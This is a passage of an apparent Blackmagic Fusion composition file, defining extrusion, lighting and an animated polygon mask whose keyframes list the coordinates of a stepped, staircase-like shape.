					Source = ""Value"",
				},
				ExtrusionDepth = Input { Value = 0.1, },
				SmoothingAngle = Input { Value = 0, },
				[""MtlStdInputs.Specular.Nest""] = Input { Value = 1, },
				[""MtlStdInputs.Specular.Intensity""] = Input { Value = 0, },
				[""MtlStdInputs.MaterialID""] = Input { Value = 8, }
			},
			ViewInfo = OperatorInfo { Pos = { -2970, 1897.5 } },
		},
		Extrude3D1_1ExtrusionProfile = LUTBezier {
			KeyColorSplines = {
				[0] = {
					[0] = { 0, RH = { 0.333333333333333, 0.333333333333333 }, Flags = { Linear = true } },
					[1] = { 1, LH = { 0.666666666666667, 0.666666666666667 }, Flags = { Linear = true } }
				}
			},
			SplineColor = { Red = 192, Green = 128, Blue = 64 },
			CtrlWZoom = false,
		},
		AmbientLight1_1 = LightAmbient {
			Inputs = {
				Intensity = Input { Value = 0.2, }
			},
			ViewInfo = OperatorInfo { Pos = { -3080, 1963.5 } },
		},
		PointLight1_1_1 = LightPoint {
			Inputs = {
				[""Transform3DOp.Translate.X""] = Input { Value = 0.983763251925422, },
				[""Transform3DOp.Translate.Y""] = Input { Value = 0.93105237776736, },
				[""Transform3DOp.Translate.Z""] = Input { Value = 0.983974189391058, },
				Intensity = Input { Value = 3, },
				DecayType = Input { Value = 2, },
				[""ShadowLightInputs3D.ShadowsEnabled""] = Input { Value = 1, },
				[""ShadowLightInputs3D.ShadowMapSize""] = Input { Value = 2048, }
			},
			ViewInfo = OperatorInfo { Pos = { -2805, 1996.5 } },
		},
		sPolygon2 = sPolygon {
			DrawMode = ""InsertAndModify"",
			Inputs = {
				Polyline = Input {
					SourceOp = ""sPolygon2Polyline"",
					Source = ""Value"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { -3135, 1897.5 } },
		},
		sPolygon2Polyline = BezierSpline {
			SplineColor = { Red = 173, Green = 255, Blue = 47 },
			CtrlWZoom = false,
			KeyFrames = {
				[21] = { 0, RH = { 28, 0.333333333333333 }, Flags = { Linear = true, LockedY = true }, Value = Polyline {
						Closed = true,
						Points = {
							{ Linear = true, X = -0.375323331608898, Y = -0.437920331091568, LX = 0.0417744438696327, LY = 0.000140110363855842, RX = -6.37838815677287e-05, RY = 0.0416737001441197 },
							{ Linear = true, X = -0.375514683253601, Y = -0.312899230659209, LX = 6.37838815677287e-05, LY = -0.0416737001441197, RX = 0.0209191996683986, RY = 6.05942278850136e-05 },
							{ Linear = true, X = -0.312757084248405, Y = -0.312717447975554, LX = -0.0209191996683986, LY = -6.05942278850136e-05, RX = 4.35092048931551e-05, RY = 0.0207654344614719 },
							{ Linear = true, X = -0.312626556633726, Y = -0.250421144591138, LX = -4.35092048931551e-05, LY = -0.0207654344614719, RX = 0.0207809261896367, RY = 0.000102510137951151 },
							{ Linear = true, X = -0.250283778064816, Y = -0.250113614177284, LX = -0.0207809261896367, LY = -0.000102510137951151, RX = -7.78508364736215e-05, RY = 0.0208712047257615 },
							{ Linear = true, X = -0.250517330574237, Y = -0.1875, LX = 7.78508364736215e-05, LY = -0.0208712047257615, RX = 0.0209164622520956, RY = -8.46403536489126e-05 },
							{ Linear = true, X = -0.18776794381795, Y = -0.187753921060947, LX = -0.0209164622520956, LY = 8.46403536489126e-05, RX = 8.93146059833353e-05, RY = 0.0209179736869822 },
							{ Linear = true, X = -0.1875, Y = -0.125, LX = -8.93146059833353e-05, LY = -0.0209179736869822, RX = 0.0206824452491809, RY = -0.000150888084152432 },
							{ Linear = true, X = -0.125452664252457, Y = -0.125452664252457, LX = -0.0206824452491809, LY = 0.000150888084152432, RX = 0, RY = 0.0208656664942231 },
							{ Linear = true, X = -0.125452664252457, Y = -0.0628556647697879, LX = 0, LY = -0.0208656664942231, RX = 0.0209842214174858, RY = 0.000118554923262631 },
							{ Linear = true, X = -0.0625, Y = -0.0625, LX = -0.0209842214174858, LY = -0.000118554923262631, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = -0.0625, Y = 0, LX = 0, LY = -0.0208333333333333, RX = 0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0, Y = 0, LX = -0.0208333333333333, LY = 0, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = 0, Y = 0.0625, LX = 0, LY = -0.0208333333333333, RX = 0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0.0625, Y = 0.0625, LX = -0.0208333333333333, LY = 0, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = 0.0625, Y = 0.125, LX = 0, LY = -0.0208333333333333, RX = 0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0.125, Y = 0.125, LX = -0.0208333333333333, LY = 0, RX = -0.000427350427350426, RY = 0.0208333333333333 },
							{ Linear = true, X = 0.123717948717949, Y = 0.1875, LX = 0.000427350427350426, LY = -0.0208333333333333, RX = -0.0829059829059829, RY = 0 },
							{ Linear = true, X = -0.125, Y = 0.1875, LX = 0.0829059829059829, LY = 0, RX = -0.000427350427350426, RY = 0.0208333333333333 },
							{ Linear = true, X = -0.126282051282051, Y = 0.25, LX = 0.000427350427350426, LY = -0.0208333333333333, RX = -0.0204059829059829, RY = 0 },
							{ Linear = true, X = -0.1875, Y = 0.25, LX = 0.0204059829059829, LY = 0, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = -0.1875, Y = 0.3125, LX = 0, LY = -0.0208333333333333, RX = 0.0208333333333333, RY = 0 },
							{ Linear = true, X = -0.125, Y = 0.3125, LX = -0.0208333333333333, LY = 0, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = -0.125, Y = 0.375, LX = 0, LY = -0.0208333333333333, RX = 0.104166666666667, RY = 0 },
							{ Linear = true, X = 0.1875, Y = 0.375, LX = -0.104166666666667, LY = 0, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = 0.1875, Y = 0.3125, LX = 0, LY = 0.0208333333333333, RX = 0.0625, RY = 0 },
							{ Linear = true, X = 0.375, Y = 0.3125, LX = -0.0625, LY = 0, RX = -6.46663217796125e-05, RY = -0.0625215554405932 },
							{ Linear = true, X = 0.374806001034661, Y = 0.12493533367822, LX = 6.46663217796125e-05, LY = 0.0625215554405932, RX = 0.0208979996551129, RY = 2.15554405932072e-05 },
							{ Linear = true, X = 0.4375, Y = 0.125, LX = -0.0208979996551129, LY = -2.15554405932072e-05, RX = 0, RY = -0.104166666666667 },
							{ Linear = true, X = 0.4375, Y = -0.1875, LX = 0, LY = 0.104166666666667, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0.375, Y = -0.1875, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.021005776858079 },
							{ Linear = true, X = 0.375, Y = -0.250517330574237, LX = 0, LY = 0.021005776858079, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0.3125, Y = -0.250517330574237, LX = 0.0208333333333333, LY = 0, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = 0.3125, Y = -0.188017330574237, LX = 0, LY = -0.0208333333333333, RX = -0.0208333333333333, RY = 0.000172443524745649 },
							{ Linear = true, X = 0.25, Y = -0.1875, LX = 0.0208333333333333, LY = -0.000172443524745649, RX = -0.000427350427350426, RY = 0.0829059829059829 },
							{ Linear = true, X = 0.248717948717949, Y = 0.0612179487179487, LX = 0.000427350427350426, LY = -0.0829059829059829, RX = -0.0204059829059829, RY = 0.000427350427350428 },
							{ Linear = true, X = 0.1875, Y = 0.0625, LX = 0.0204059829059829, LY = -0.000427350427350428, RX = -0.00016166580444904, RY = -0.0208872219348163 },
							{ Linear = true, X = 0.187015002586653, Y = -0.000161665804449043, LX = 0.00016166580444904, LY = 0.0208872219348163, RX = -0.0206716675288843, RY = 5.38886014830143e-05 },
							{ Linear = true, X = 0.125, Y = 0, LX = 0.0206716675288843, LY = -5.38886014830143e-05, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = 0.125, Y = -0.0625, LX = 0, LY = 0.0208333333333333, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0.0625, Y = -0.0625, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = 0.0625, Y = -0.125, LX = 0, LY = 0.0208333333333333, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0, Y = -0.125, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = 0, Y = -0.1875, LX = 0, LY = 0.0208333333333333, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = -0.0625, Y = -0.1875, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = -0.0625, Y = -0.25, LX = 0, LY = 0.0208333333333333, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = -0.125, Y = -0.25, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = -0.125, Y = -0.3125, LX = 0, LY = 0.0208333333333333, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = -0.1875, Y = -0.3125, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.021005776858079 },
							{ Linear = true, X = -0.1875, Y = -0.375517330574237, LX = 0, LY = 0.021005776858079, RX = -0.0208333333333333, RY = 0.000172443524745639 },
							{ Linear = true, X = -0.25, Y = -0.375, LX = 0.0208333333333333, LY = -0.000172443524745639, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = -0.25, Y = -0.4375, LX = 0, LY = 0.0208333333333333, RX = -0.0417744438696327, RY = -0.000140110363855842 }
						}
					} },
				[42] = { 1, LH = { 35, 0.666666666666667 }, RH = { 50.6666666666667, 1.33333333333333 }, Flags = { Linear = true, LockedY = true }, Value = Polyline {
						Closed = true,
						Points = {
							{ Linear = true, X = -0.375323331608898, Y = -0.437920331091568, LX = 0.0417744438696327, LY = 0.000140110363855842, RX = -6.37838815677287e-05, RY = 0.0416737001441197 },
							{ Linear = true, X = -0.375514683253601, Y = -0.312899230659209, LX = 6.37838815677287e-05, LY = -0.0416737001441197, RX = 0.0209191996683986, RY = 6.05942278850136e-05 },
							{ Linear = true, X = -0.312757084248405, Y = -0.312717447975554, LX = -0.0209191996683986, LY = -6.05942278850136e-05, RX = 4.35092048931551e-05, RY = 0.0207654344614719 },
							{ Linear = true, X = -0.312626556633726, Y = -0.250421144591138, LX = -4.35092048931551e-05, LY = -0.0207654344614719, RX = 0.0207809261896367, RY = 0.000102510137951151 },
							{ Linear = true, X = -0.250283778064816, Y = -0.250113614177284, LX = -0.0207809261896367, LY = -0.000102510137951151, RX = -7.78508364736215e-05, RY = 0.0208712047257615 },
							{ Linear = true, X = -0.250517330574237, Y = -0.1875, LX = 7.78508364736215e-05, LY = -0.0208712047257615, RX = 0.0209164622520956, RY = -8.46403536489126e-05 },
							{ Linear = true, X = -0.18776794381795, Y = -0.187753921060947, LX = -0.0209164622520956, LY = 8.46403536489126e-05, RX = 8.93146059833353e-05, RY = 0.0209179736869822 },
							{ Linear = true, X = -0.1875, Y = -0.125, LX = -8.93146059833353e-05, LY = -0.0209179736869822, RX = 0.0206824452491809, RY = -0.000150888084152432 },
							{ Linear = true, X = -0.125452664252457, Y = -0.125452664252457, LX = -0.0206824452491809, LY = 0.000150888084152432, RX = 0, RY = 0.0208656664942231 },
							{ Linear = true, X = -0.125452664252457, Y = -0.0628556647697879, LX = 0, LY = -0.0208656664942231, RX = 0.0209842214174858, RY = 0.000118554923262631 },
							{ Linear = true, X = -0.0625, Y = -0.0625, LX = -0.0209842214174858, LY = -0.000118554923262631, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = -0.0625, Y = 0, LX = 0, LY = -0.0208333333333333, RX = 0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0, Y = 0, LX = -0.0208333333333333, LY = 0, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = 0, Y = 0.0625, LX = 0, LY = -0.0208333333333333, RX = 0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0.0625, Y = 0.0625, LX = -0.0208333333333333, LY = 0, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = 0.0625, Y = 0.125, LX = 0, LY = -0.0208333333333333, RX = 0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0.125, Y = 0.125, LX = -0.0208333333333333, LY = 0, RX = -0.000427350427350426, RY = 0.0208333333333333 },
							{ Linear = true, X = 0.123717948717949, Y = 0.1875, LX = 0.000427350427350426, LY = -0.0208333333333333, RX = -0.0829059829059829, RY = 0 },
							{ Linear = true, X = -0.125, Y = 0.1875, LX = 0.0829059829059829, LY = 0, RX = -0.000338495388000337, RY = 0.0208333333333333 },
							{ Linear = true, X = -0.126015486164001, Y = 0.25, LX = 0.000338495388000337, LY = -0.0208333333333333, RX = -0.020494837945333, RY = 0 },
							{ Linear = true, X = -0.1875, Y = 0.25, LX = 0.020494837945333, LY = 0, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = -0.1875, Y = 0.3125, LX = 0, LY = -0.0208333333333333, RX = 0.0208333333333333, RY = 0 },
							{ Linear = true, X = -0.125, Y = 0.3125, LX = -0.0208333333333333, LY = 0, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = -0.125, Y = 0.375, LX = 0, LY = -0.0208333333333333, RX = 0.104166666666667, RY = 0 },
							{ Linear = true, X = 0.1875, Y = 0.375, LX = -0.104166666666667, LY = 0, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = 0.1875, Y = 0.3125, LX = 0, LY = 0.0208333333333333, RX = 0.0625, RY = 0 },
							{ Linear = true, X = 0.375, Y = 0.3125, LX = -0.0625, LY = 0, RX = -6.46663217796125e-05, RY = -0.0625215554405932 },
							{ Linear = true, X = 0.374806001034661, Y = 0.12493533367822, LX = 6.46663217796125e-05, LY = 0.0625215554405932, RX = 0.0208979996551129, RY = 2.15554405932072e-05 },
							{ Linear = true, X = 0.4375, Y = 0.125, LX = -0.0208979996551129, LY = -2.15554405932072e-05, RX = 0, RY = -0.104166666666667 },
							{ Linear = true, X = 0.4375, Y = -0.1875, LX = 0, LY = 0.104166666666667, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0.375, Y = -0.1875, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.021005776858079 },
							{ Linear = true, X = 0.375, Y = -0.250517330574237, LX = 0, LY = 0.021005776858079, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0.3125, Y = -0.250517330574237, LX = 0.0208333333333333, LY = 0, RX = -0.000854700854700852, RY = 0.0208333333333333 },
							{ Linear = true, X = 0.309935897435897, Y = -0.188017330574237, LX = 0.000854700854700852, LY = -0.0208333333333333, RX = -0.0199786324786325, RY = 0.000172443524745658 },
							{ Linear = true, X = 0.25, Y = -0.1875, LX = 0.0199786324786325, LY = -0.000172443524745658, RX = -0.000427350427350426, RY = 0.0829059829059829 },
							{ Linear = true, X = 0.248717948717949, Y = 0.0612179487179487, LX = 0.000427350427350426, LY = -0.0829059829059829, RX = -0.0204059829059829, RY = 0.000427350427350428 },
							{ Linear = true, X = 0.1875, Y = 0.0625, LX = 0.0204059829059829, LY = -0.000427350427350428, RX = -0.00016166580444904, RY = -0.0208872219348163 },
							{ Linear = true, X = 0.187015002586653, Y = -0.000161665804449043, LX = 0.00016166580444904, LY = 0.0208872219348163, RX = -0.0206716675288843, RY = 5.38886014830143e-05 },
							{ Linear = true, X = 0.125, Y = 0, LX = 0.0206716675288843, LY = -5.38886014830143e-05, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = 0.125, Y = -0.0625, LX = 0, LY = 0.0208333333333333, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0.0625, Y = -0.0625, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = 0.0625, Y = -0.125, LX = 0, LY = 0.0208333333333333, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0, Y = -0.125, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = 0, Y = -0.1875, LX = 0, LY = 0.0208333333333333, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = -0.0625, Y = -0.1875, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = -0.0625, Y = -0.25, LX = 0, LY = 0.0208333333333333, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = -0.125, Y = -0.25, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = -0.125, Y = -0.3125, LX = 0, LY = 0.0208333333333333, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = -0.1875, Y = -0.3125, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.021005776858079 },
							{ Linear = true, X = -0.1875, Y = -0.375517330574237, LX = 0, LY = 0.021005776858079, RX = -0.0208333333333333, RY = 0.000172443524745639 },
							{ Linear = true, X = -0.25, Y = -0.375, LX = 0.0208333333333333, LY = -0.000172443524745639, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = -0.25, Y = -0.4375, LX = 0, LY = 0.0208333333333333, RX = -0.0417744438696327, RY = -0.000140110363855842 }
						}
					} },
				[68] = { 2, LH = { 59.3333333333333, 1.66666666666667 }, RH = { 86, 2.33333333333333 }, Flags = { Linear = true, LockedY = true }, Value = Polyline {
						Closed = true,
						Points = {
							{ Linear = true, X = -0.375323331608898, Y = -0.437920331091568, LX = 0.0417744438696327, LY = 0.000140110363855842, RX = -6.37838815677287e-05, RY = 0.0416737001441197 },
							{ Linear = true, X = -0.375514683253601, Y = -0.312899230659209, LX = 6.37838815677287e-05, LY = -0.0416737001441197, RX = 0.0209191996683986, RY = 6.05942278850136e-05 },
							{ Linear = true, X = -0.312757084248405, Y = -0.312717447975554, LX = -0.0209191996683986, LY = -6.05942278850136e-05, RX = 4.35092048931551e-05, RY = 0.0207654344614719 },
							{ Linear = true, X = -0.312626556633726, Y = -0.250421144591138, LX = -4.35092048931551e-05, LY = -0.0207654344614719, RX = 0.0207809261896367, RY = 0.000102510137951151 },
							{ Linear = true, X = -0.250283778064816, Y = -0.250113614177284, LX = -0.0207809261896367, LY = -0.000102510137951151, RX = -7.78508364736215e-05, RY = 0.0208712047257615 },
							{ Linear = true, X = -0.250517330574237, Y = -0.1875, LX = 7.78508364736215e-05, LY = -0.0208712047257615, RX = 0.0209164622520956, RY = -8.46403536489126e-05 },
							{ Linear = true, X = -0.18776794381795, Y = -0.187753921060947, LX = -0.0209164622520956, LY = 8.46403536489126e-05, RX = 8.93146059833353e-05, RY = 0.0209179736869822 },
							{ Linear = true, X = -0.1875, Y = -0.125, LX = -8.93146059833353e-05, LY = -0.0209179736869822, RX = 0.0206824452491809, RY = -0.000150888084152432 },
							{ Linear = true, X = -0.125452664252457, Y = -0.125452664252457, LX = -0.0206824452491809, LY = 0.000150888084152432, RX = 0, RY = 0.0208656664942231 },
							{ Linear = true, X = -0.125452664252457, Y = -0.0628556647697879, LX = 0, LY = -0.0208656664942231, RX = 0.0209842214174858, RY = 0.000118554923262631 },
							{ Linear = true, X = -0.0625, Y = -0.0625, LX = -0.0209842214174858, LY = -0.000118554923262631, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = -0.0625, Y = 0, LX = 0, LY = -0.0208333333333333, RX = 0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0, Y = 0, LX = -0.0208333333333333, LY = 0, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = 0, Y = 0.0625, LX = 0, LY = -0.0208333333333333, RX = 0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0.0625, Y = 0.0625, LX = -0.0208333333333333, LY = 0, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = 0.0625, Y = 0.125, LX = 0, LY = -0.0208333333333333, RX = 0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0.125, Y = 0.125, LX = -0.0208333333333333, LY = 0, RX = -0.000427350427350426, RY = 0.0208333333333333 },
							{ Linear = true, X = 0.123717948717949, Y = 0.1875, LX = 0.000427350427350426, LY = -0.0208333333333333, RX = -0.0829059829059829, RY = 0 },
							{ Linear = true, X = -0.125, Y = 0.1875, LX = 0.0829059829059829, LY = 0, RX = -0.00108318524160108, RY = 0.0208333333333333 },
							{ Linear = true, X = -0.128249555724803, Y = 0.25, LX = 0.00108318524160108, LY = -0.0208333333333333, RX = -0.0197501480917323, RY = 0 },
							{ Linear = true, X = -0.1875, Y = 0.25, LX = 0.0197501480917323, LY = 0, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = -0.1875, Y = 0.3125, LX = 0, LY = -0.0208333333333333, RX = 0.0208333333333333, RY = 0 },
							{ Linear = true, X = -0.125, Y = 0.3125, LX = -0.0208333333333333, LY = 0, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = -0.125, Y = 0.375, LX = 0, LY = -0.0208333333333333, RX = 0.104166666666667, RY = 0 },
							{ Linear = true, X = 0.1875, Y = 0.375, LX = -0.104166666666667, LY = 0, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = 0.1875, Y = 0.3125, LX = 0, LY = 0.0208333333333333, RX = 0.0625, RY = 0 },
							{ Linear = true, X = 0.375, Y = 0.3125, LX = -0.0625, LY = 0, RX = -6.46663217796125e-05, RY = -0.0625215554405932 },
							{ Linear = true, X = 0.374806001034661, Y = 0.12493533367822, LX = 6.46663217796125e-05, LY = 0.0625215554405932, RX = 0.0208979996551129, RY = 2.15554405932072e-05 },
							{ Linear = true, X = 0.4375, Y = 0.125, LX = -0.0208979996551129, LY = -2.15554405932072e-05, RX = 0, RY = -0.104166666666667 },
							{ Linear = true, X = 0.4375, Y = -0.1875, LX = 0, LY = 0.104166666666667, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0.375, Y = -0.1875, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.021005776858079 },
							{ Linear = true, X = 0.375, Y = -0.250517330574237, LX = 0, LY = 0.021005776858079, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0.3125, Y = -0.250517330574237, LX = 0.0208333333333333, LY = 0, RX = -0.000576923076923075, RY = 0.0208333333333333 },
							{ Linear = true, X = 0.310769230769231, Y = -0.188017330574237, LX = 0.000576923076923075, LY = -0.0208333333333333, RX = -0.0202564102564103, RY = 0.000172443524745655 },
							{ Linear = true, X = 0.25, Y = -0.1875, LX = 0.0202564102564103, LY = -0.000172443524745655, RX = -0.000427350427350426, RY = 0.0829059829059829 },
							{ Linear = true, X = 0.248717948717949, Y = 0.0612179487179487, LX = 0.000427350427350426, LY = -0.0829059829059829, RX = -0.0204059829059829, RY = 0.000427350427350428 },
							{ Linear = true, X = 0.1875, Y = 0.0625, LX = 0.0204059829059829, LY = -0.000427350427350428, RX = -0.00016166580444904, RY = -0.0208872219348163 },
							{ Linear = true, X = 0.187015002586653, Y = -0.000161665804449043, LX = 0.00016166580444904, LY = 0.0208872219348163, RX = -0.0206716675288843, RY = 5.38886014830143e-05 },
							{ Linear = true, X = 0.125, Y = 0, LX = 0.0206716675288843, LY = -5.38886014830143e-05, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = 0.125, Y = -0.0625, LX = 0, LY = 0.0208333333333333, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0.0625, Y = -0.0625, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = 0.0625, Y = -0.125, LX = 0, LY = 0.0208333333333333, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0, Y = -0.125, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = 0, Y = -0.1875, LX = 0, LY = 0.0208333333333333, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = -0.0625, Y = -0.1875, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = -0.0625, Y = -0.25, LX = 0, LY = 0.0208333333333333, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = -0.125, Y = -0.25, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = -0.125, Y = -0.3125, LX = 0, LY = 0.0208333333333333, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = -0.1875, Y = -0.3125, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.021005776858079 },
							{ Linear = true, X = -0.1875, Y = -0.375517330574237, LX = 0, LY = 0.021005776858079, RX = -0.0208333333333333, RY = 0.000172443524745639 },
							{ Linear = true, X = -0.25, Y = -0.375, LX = 0.0208333333333333, LY = -0.000172443524745639, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = -0.25, Y = -0.4375, LX = 0, LY = 0.0208333333333333, RX = -0.0417744438696327, RY = -0.000140110363855842 }
						}
					} },
				[122] = { 3, LH = { 104, 2.66666666666667 }, RH = { 145, 3.33333333333333 }, Flags = { Linear = true, LockedY = true }, Value = Polyline {
						Closed = true,
						Points = {
							{ Linear = true, X = -0.375323331608898, Y = -0.437920331091568, LX = 0.0417744438696327, LY = 0.000140110363855842, RX = -6.37838815677287e-05, RY = 0.0416737001441197 },
							{ Linear = true, X = -0.375514683253601, Y = -0.312899230659209, LX = 6.37838815677287e-05, LY = -0.0416737001441197, RX = 0.0209191996683986, RY = 6.05942278850136e-05 },
							{ Linear = true, X = -0.312757084248405, Y = -0.312717447975554, LX = -0.0209191996683986, LY = -6.05942278850136e-05, RX = 4.35092048931551e-05, RY = 0.0207654344614719 },
							{ Linear = true, X = -0.312626556633726, Y = -0.250421144591138, LX = -4.35092048931551e-05, LY = -0.0207654344614719, RX = 0.0207809261896367, RY = 0.000102510137951151 },
							{ Linear = true, X = -0.250283778064816, Y = -0.250113614177284, LX = -0.0207809261896367, LY = -0.000102510137951151, RX = -7.78508364736215e-05, RY = 0.0208712047257615 },
							{ Linear = true, X = -0.250517330574237, Y = -0.1875, LX = 7.78508364736215e-05, LY = -0.0208712047257615, RX = 0.0209164622520956, RY = -8.46403536489126e-05 },
							{ Linear = true, X = -0.18776794381795, Y = -0.187753921060947, LX = -0.0209164622520956, LY = 8.46403536489126e-05, RX = 8.93146059833353e-05, RY = 0.0209179736869822 },
							{ Linear = true, X = -0.1875, Y = -0.125, LX = -8.93146059833353e-05, LY = -0.0209179736869822, RX = 0.0206824452491809, RY = -0.000150888084152432 },
							{ Linear = true, X = -0.125452664252457, Y = -0.125452664252457, LX = -0.0206824452491809, LY = 0.000150888084152432, RX = 0, RY = 0.0208656664942231 },
							{ Linear = true, X = -0.125452664252457, Y = -0.0628556647697879, LX = 0, LY = -0.0208656664942231, RX = 0.0209842214174858, RY = 0.000118554923262631 },
							{ Linear = true, X = -0.0625, Y = -0.0625, LX = -0.0209842214174858, LY = -0.000118554923262631, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = -0.0625, Y = 0, LX = 0, LY = -0.0208333333333333, RX = 0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0, Y = 0, LX = -0.0208333333333333, LY = 0, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = 0, Y = 0.0625, LX = 0, LY = -0.0208333333333333, RX = 0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0.0625, Y = 0.0625, LX = -0.0208333333333333, LY = 0, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = 0.0625, Y = 0.125, LX = 0, LY = -0.0208333333333333, RX = 0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0.125, Y = 0.125, LX = -0.0208333333333333, LY = 0, RX = -0.000427350427350426, RY = 0.0208333333333333 },
							{ Linear = true, X = 0.123717948717949, Y = 0.1875, LX = 0.000427350427350426, LY = -0.0208333333333333, RX = -0.0829059829059829, RY = 0 },
							{ Linear = true, X = -0.125, Y = 0.1875, LX = 0.0829059829059829, LY = 0, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = -0.125, Y = 0.25, LX = 0, LY = -0.0208333333333333, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = -0.1875, Y = 0.25, LX = 0.0208333333333333, LY = 0, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = -0.1875, Y = 0.3125, LX = 0, LY = -0.0208333333333333, RX = 0.0208333333333333, RY = 0 },
							{ Linear = true, X = -0.125, Y = 0.3125, LX = -0.0208333333333333, LY = 0, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = -0.125, Y = 0.375, LX = 0, LY = -0.0208333333333333, RX = 0.104166666666667, RY = 0 },
							{ Linear = true, X = 0.1875, Y = 0.375, LX = -0.104166666666667, LY = 0, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = 0.1875, Y = 0.3125, LX = 0, LY = 0.0208333333333333, RX = 0.0625, RY = 0 },
							{ Linear = true, X = 0.375, Y = 0.3125, LX = -0.0625, LY = 0, RX = -6.46663217796125e-05, RY = -0.0625215554405932 },
							{ Linear = true, X = 0.374806001034661, Y = 0.12493533367822, LX = 6.46663217796125e-05, LY = 0.0625215554405932, RX = 0.0208979996551129, RY = 2.15554405932072e-05 },
							{ Linear = true, X = 0.4375, Y = 0.125, LX = -0.0208979996551129, LY = -2.15554405932072e-05, RX = 0, RY = -0.104166666666667 },
							{ Linear = true, X = 0.4375, Y = -0.1875, LX = 0, LY = 0.104166666666667, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0.375, Y = -0.1875, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.021005776858079 },
